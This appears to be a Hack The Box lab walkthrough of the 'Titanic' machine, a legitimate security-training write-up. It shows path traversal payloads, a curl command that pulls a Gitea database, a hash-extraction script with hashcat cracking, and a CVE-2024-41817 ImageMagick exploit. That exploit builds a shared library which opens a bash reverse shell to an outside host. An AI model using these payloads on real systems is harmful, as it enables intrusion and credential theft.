---
title: "HTB Lab: Titanic"
date: 2025-02-16 10:00:00 +0000
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2025-02-17-htb-titanic
categories: [Linux, HTB-Easy]
tags: [Titanic, Directory Traversal, Gitea, Nmap, Hashcat, ImageMagick, CVE-2024-41817]
description: "A comprehensive walkthrough of exploiting the Titanic HTB machine, from initial Nmap scanning and directory traversal to cracking Gitea hashes and leveraging a vulnerable ImageMagick (CVE-2024-41817) for root access."
---
# Titanic

Machine Name: **Titanic**  
OS: **Linux**  
Difficulty: **Easy**  
User Blood: **jazzpizazz**  
System Blood: **Vz0n**

---




## Introduction

In this writeup, we walk through the exploitation of the Titanic machine on HTB, an easy-level Linux target. We begin by performing an Nmap scan to identify open services before discovering a directory traversal vulnerability on the booking form's download endpoint. This vulnerability leads us to uncover a hidden Gitea instance, from which we identify a `gitea.db` used to extract and crack user hashes to gain SSH access as the developer user. Finally, by exploiting a vulnerable version of ImageMagick (CVE-2024-41817), we escalate our privileges to root and capture both the user and root flags.

---

## Port Enumeration with Nmap

### Nmap Command

```bash
nmap -sC -sV -sU --top-ports 200 -o nmap_output 10.10.11.55
```

### Nmap Command Output

```bash
# Nmap 7.95 scan initiated Sun Feb 16 19:00:00 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -T4 -oA nmap_output 10.10.11.55
Nmap scan report for 10.10.11.55
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
# Nmap done at Sun Feb 16 19:00:08 2025 -- 1 IP address (1 host up) scanned in 8.35 seconds
```

From the results, we see two open TCP ports:  
- **22/tcp**: SSH (OpenSSH 8.9p1)  
- **80/tcp**: HTTP (Apache 2.4.52)  

---

## Initial Enumeration on Port 80

Navigating to `http://titanic.htb` displays a website featuring a booking form:

![Forum on Titanic.htb](Pasted%20image%2020250216193848.png)

When this form is submitted, two requests are made:

10. **POST /book** with form data (name, email, phone, date, and cabin).
11. **GET /download?ticket=\<ID\>.json** returning a JSON file with the submitted data:

```
{
  "name": "zer0",
  "email": "zer0@htb.com",
  "phone": "123-456-7891",
  "date": "2025-02-16",
  "cabin": "Suite"
}
```

---

## Directory Traversal

Noticing the `download` endpoint, we attempt a **directory traversal** payload:

```http
GET /download?ticket=../../../../../../../../etc/hosts HTTP/1.1
```

This successfully returns the contents of `/etc/hosts`, confirming we have **read access** on the filesystem via a path traversal vulnerability:

```bash
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic
...
```

Here we discover a subdomain: **dev.titanic.htb**. We add this to our own `/etc/hosts` file and navigate to it.

---

## Exploring dev.titanic.htb

Visiting `http://dev.titanic.htb` reveals a Gitea interface. In one of the repositories (**developer/docker-config**), a commit (`22f11c1c4`) references a mounted volume at `/home/developer/gitea/data`. We suspect that the Gitea database might contain credentials or other useful information.

![](Pasted%20image%2020250217120827.png)

---

## Extracting the Gitea Database

Using the path traversal vulnerability again, we request the Gitea database directly:

```
GET /download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db
```

We can use `curl` to save the file locally:

```bash
curl "http://titanic.htb/download?ticket=../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db
```

Inspecting it shows:

```bash
file gitea.db
# gitea.db: SQLite 3.x database ...
```

---

## Cracking the Hashes

Next, we dump the Gitea user hashes using a Python script (adapted from [gitea3hashcat.py](https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271)):

```python
import sqlite3
import base64
import sys

if len(sys.argv) != 2:
    print("Usage: python3 gitea3hashcat.py <gitea.db>")
    sys.exit(1)

try:
    con = sqlite3.connect(sys.argv[1])
    cursor = con.cursor()
    cursor.execute("SELECT name,passwd_hash_algo,salt,passwd FROM user")
    for row in cursor.fetchall():
        if "pbkdf2" in row[1]:
            algo, iterations, keylen = row[1].split("$")
            algo = "sha256"
            name = row[0]
        else:
            raise Exception("Unknown Algorithm")
        salt = bytes.fromhex(row[2])
        passwd = bytes.fromhex(row[3])
        salt_b64 = base64.b64encode(salt).decode("utf-8")
        passwd_b64 = base64.b64encode(passwd).decode("utf-8")
        print(f"{name}:{algo}:{iterations}:{salt_b64}:{passwd_b64}")
except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)
```

Running the script gives us hashes for various users:

```bash
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
...
```

We use **hashcat** to crack them:

```bash
hashcat -m 10900 hash.txt rockyou.txt -o cracked.txt
```

Eventually, we discover valid credentials. For example:

```
developer:sha256:50000:... = 25282528
```

---

## SSH Access and User Flag

Armed with these credentials, we SSH into the target:

```bash
ssh developer@10.10.11.55
```

After logging in, we retrieve the user flag:

```bash
developer@titanic:~$ cat user.txt
8e14e18a329c3b041af6c8688bdaafa3
```

And that concludes the user-level compromise for the **Titanic** machine.

## Root Flag and CVE-2024-41817

After enumerating the machine, we find the following interesting file:

```bash
-rwxr-xr-x 1 root root  167 Feb  3 17:11 identify_images.sh
```

```bash
developer@titanic:/opt/scripts$ cat identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Looking at the magick version used in the script we identify the following:

```bash
 Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

This version of magick is vulnerable to Arbitrary Code Execution under [CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8). We modify the POC used in the github security advisory to get a reverse shell onto the root user:

```c
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/3333 0>&1'");
    exit(0);
}
EOF
```

```bash
nc -lnvp 3333
```
```bash
listening on [any] 3333 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.55] 56142
bash: cannot set terminal process group (40510): Inappropriate ioctl for device
bash: no job control in this shell
root@titanic:/opt/app/static/assets/images# whoami
root
```

![](Pasted%20image%2020250217192518.png)


## Useful Links

- [CVE](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
- [Gitea Hash Grapper](https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271)
